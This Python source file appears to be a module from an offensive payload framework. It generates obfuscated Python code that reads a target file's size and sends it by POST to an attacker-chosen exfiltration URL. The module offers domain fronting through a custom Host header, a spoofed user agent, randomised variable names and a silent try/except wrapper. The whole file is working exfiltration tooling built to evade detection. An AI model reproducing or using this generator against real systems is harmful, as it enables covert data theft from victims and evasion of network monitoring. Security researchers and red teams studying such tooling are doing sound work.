from payloads.helpers.string import unique_random_string_set
from payloads.modules.python.common import obfuscate_python_string, urllib_callback


class Module:

    def __init__(self, params=[]):

        self.info = {
            'Author': 'Alain Homewood',
            'Description': 'Exfiltrates a file\'s size in bytes to a URL using a POST request',
        }

        self.options = {
            'File': {
                'Description': 'The file to get the size of',
                'Required': True,
                'Value': ''
            },
            'Exfiltration URL': {
                'Description': 'The URL to exfiltrate data to',
                'Required': True,
                'Type': 'url',
                'Value': ''
            },
            'Host Header': {
                'Description': '(Optional) Specify a custom Host header (i.e. for domain fronting)',
                'Required': False,
                'Type': 'text',
                'Value': ''
            },
            'User Agent': {
                'Description': '(Optional) Specify a custom user agent',
                'Required': False,
                'Type': 'text',
                'Value': ''
            },
        }

        for param in params:
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):
        random_variables = unique_random_string_set(set_size=1, length_minimum=10, length_maximum=20)
        var_post_data = random_variables[0]

        code = "import os;{0}=str(os.path.getsize(os.path.expanduser({1}))).encode();" \
               .format(var_post_data, obfuscate_python_string(self.options['File']['Value']))
        code += urllib_callback(url=self.options['Exfiltration URL']['Value'],
                                host_header=self.options['Host Header']['Value'],
                                user_agent=self.options['User Agent']['Value'],
                                post_data_variable=var_post_data,
                                try_except_wrap=False)
        code = "try:\n    {0}\nexcept:\n    pass\n".format(code)
        return code
